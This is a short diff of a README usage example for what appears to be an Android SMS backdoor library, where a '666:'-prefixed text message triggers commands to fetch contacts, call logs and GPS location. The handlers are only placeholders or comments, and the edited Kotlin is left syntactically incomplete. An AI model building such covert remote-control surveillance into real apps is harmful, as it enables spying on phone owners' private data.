@@ -23,10 +23,10 @@ dependencies {
 //666: is the command code. So you would start all of your remote commands for example: 666: COMMAND_GET_CONTACTS
 BackdoorService.openDoor(this, "666:"){ remoteCommand ->
     when(remoteCommand){
-        "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
-        "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
-        "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
-        else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
+        "COMMAND_GET_CONTACTS" -> //get contacts
+        "COMMAND_GET_CALL_LOG" -> //get call log
+        "COMMAND_GET_LOCATION" -> //get gps location
+        else -> //command not found
     }
 }
 ```
